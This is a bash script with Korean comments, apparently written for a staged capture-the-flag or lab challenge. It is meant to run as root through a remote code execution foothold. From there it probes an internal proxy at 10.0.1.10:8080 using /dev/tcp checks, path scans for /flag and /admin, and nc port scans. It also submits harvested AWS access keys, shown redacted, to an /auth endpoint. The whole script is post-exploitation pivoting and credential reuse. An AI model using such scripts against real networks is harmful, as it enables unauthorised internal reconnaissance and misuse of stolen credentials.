#!/bin/bash
# Stage 4: 내부 프록시 탐색 (10.0.1.10:8080)
# 서버에서 root RCE로 실행

echo "=== Stage 4 내부 프록시 탐색 ==="
echo "Target: http://10.0.1.10:8080"
echo

# 1. 연결 테스트
echo "[*] 1. 연결 테스트"
timeout 3 bash -c 'cat < /dev/null > /dev/tcp/10.0.1.10/8080' 2>&1
if [ $? -eq 0 ]; then
    echo "[+] 포트 8080 열림 (LISTENING)"
else
    echo "[!] 포트 8080 닫혀있음 또는 시간초과"
fi
echo

# 2. 기본 요청
echo "[*] 2. GET / (기본 페이지)"
curl -v -m 5 http://10.0.1.10:8080/ 2>&1 | head -50
echo
echo

# 3. 경로 스캔
echo "[*] 3. 주요 경로 스캔"
for path in /flag /stage4 /api /admin /export /status /health /config; do
    echo "  [*] GET $path"
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -m 3 http://10.0.1.10:8080$path)
    echo "      HTTP $CODE"
done
echo
echo

# 4. /api 엔드포인트 상세 조회
echo "[*] 4. /api 엔드포인트 상세"
curl -s -m 5 http://10.0.1.10:8080/api/ | head -200
echo
echo

# 5. 인증 필요 여부 확인
echo "[*] 5. 인증 관련 헤더 조회"
curl -I -m 5 http://10.0.1.10:8080/stage4 2>&1 | grep -E "^(WWW-Authenticate|Authorization|X-Required)"
echo
echo

# 6. POST 요청 (Stage 3 정보 제출)
echo "[*] 6. POST /stage4 (Stage 3 완료 알림)"
curl -X POST http://10.0.1.10:8080/stage4 \
  -H "Content-Type: application/json" \
  -d '{"stage": 3, "status": "completed"}' \
  -m 5 -v 2>&1 | head -100
echo
echo

# 7. 쿠키/인증 관련
echo "[*] 7. AWS 자격증명으로 인증 시도"
curl -X POST http://10.0.1.10:8080/auth \
  -H "Content-Type: application/json" \
  -d '{"access_key": "AKIA[REDACTED-ACCESS-KEY]", "secret_key": "[REDACTED-SECRET-KEY]"}' \
  -m 5 2>&1 | head -50
echo
echo

# 8. flag 경로의 실제 콘텐츠
echo "[*] 8. GET /flag"
curl -s -m 5 http://10.0.1.10:8080/flag | head -100
echo
echo

# 9. nmap 스캔 (포트)
echo "[*] 9. 포트 스캔 (10.0.1.10)"
timeout 5 nc -zv 10.0.1.10 {80,443,3306,5432,6379,8000,8080,8443,9000} 2>&1 || echo "(nc not available)"
echo
